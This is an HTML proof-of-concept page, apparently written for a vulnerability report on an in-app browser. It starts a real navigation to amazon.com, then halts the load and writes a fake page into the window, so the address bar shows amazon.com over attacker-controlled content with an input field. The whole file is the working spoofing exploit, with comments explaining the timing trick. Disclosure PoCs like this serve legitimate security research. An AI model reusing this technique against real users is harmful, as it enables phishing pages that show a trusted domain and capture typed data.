<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>spoof</title>
</head>
<body>

click <a href="https://www.amazon.com/" id="spoof" onclick="return go()">spoof</a>

<script>
// Shown after the bar has flipped to amazon.com (matches the mockup)
var POC = '<!doctype html><html><head><meta charset="utf-8">'
  + '<meta name="viewport" content="width=device-width, initial-scale=1"><title>amazon.com</title></head>'
  + '<body><h1>Ini Bukan Asli</h1>'
  + 'Spoof here <input type="text"> <button onclick="return false">Submit</button>'
  + '</body></html>';

function inject(){
  try { window.stop(); } catch(e){}                                  // bar keeps amazon.com, amazon load aborted
  try { document.open(); document.write(POC); document.close(); } catch(e){}
}

function go(){
  // The anchor's real (user-gesture) navigation to amazon.com starts → the IAB bar flips to amazon.com.
  // We inject the moment this page is being swapped out for amazon — bar is already amazon, content not yet committed.
  window.addEventListener('pagehide', inject, {once:true});
  window.addEventListener('visibilitychange', function(){
    if (document.visibilityState === 'hidden') inject();
  }, {once:true});
  return true;   // allow navigation
}
</script>

</body>
</html>
